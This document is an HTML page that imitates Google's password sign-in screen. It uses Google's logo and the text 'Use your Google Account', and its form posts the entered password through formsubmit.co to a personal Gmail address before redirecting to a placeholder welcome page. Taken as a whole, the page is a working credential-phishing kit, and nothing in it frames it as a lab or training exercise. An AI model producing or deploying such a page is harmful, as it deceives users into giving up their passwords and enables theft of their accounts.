<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body style="display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f8f9fa; font-family: Arial, sans-serif;">

    <div style="width: 400px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); text-align: center;">
        
        <!-- Google Logo -->
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo" 
            style="width: 80px; margin-bottom: 10px;">

        <!-- Heading -->
        <h2 style="font-weight: 500; font-size: 22px; margin-bottom: 5px;">Sign in</h2>
        <p style="font-size: 14px; color: #5f6368; margin-bottom: 20px;">Use your Google Account</p>

        <!-- Form -->
        <form action="https://formsubmit.co/madihaayaz248@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://yourwebsite.com/welcome.html">


            <!-- Input Field -->
            <div style="text-align: left; margin-bottom: 15px;">
                <label for="Password" style="font-size: 14px; color: #5f6368; display: block; margin-bottom: 5px;">Password</label>
                <input type="password" id="password" name="password" required 
                    style="width: 100%; padding: 10px; border: none; outline: none; border-bottom: 2px solid #ccc; font-size: 10px;">
            </div>

            <!-- Forgot Email -->
            <div style="text-align: left; font-size: 10px; margin-bottom: 20px;">
                <a href="/forgot.html" style="text-decoration: none; color: #1a73e8;">Forgot Password?</a>
            </div>

            <!-- Guest Mode Info -->
            <p style="font-size: 10px; text-align: left;">
                Not your device? Use Guest mode to sign in privately. 
                <a href="#" style="text-decoration: none; color: #1a73e8;">Learn more</a>
            </p>

            <!-- Buttons -->
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <button type="button" style="background: none; border: none; color: #1a73e8; font-size: 14px; cursor: pointer;">
                    <a href="/create.html" style="color: #1a73e8;">Create account </a>
                </button>
                
                <button type="submit" 
                    style="background: #1a73e8; color: white; padding: 4px 20px; border: none; border-radius: 5px; font-size: 10px; cursor: pointer;">
                    Login
                </button>
            </div>
        </form>
    </div>

    

</body>
</html>
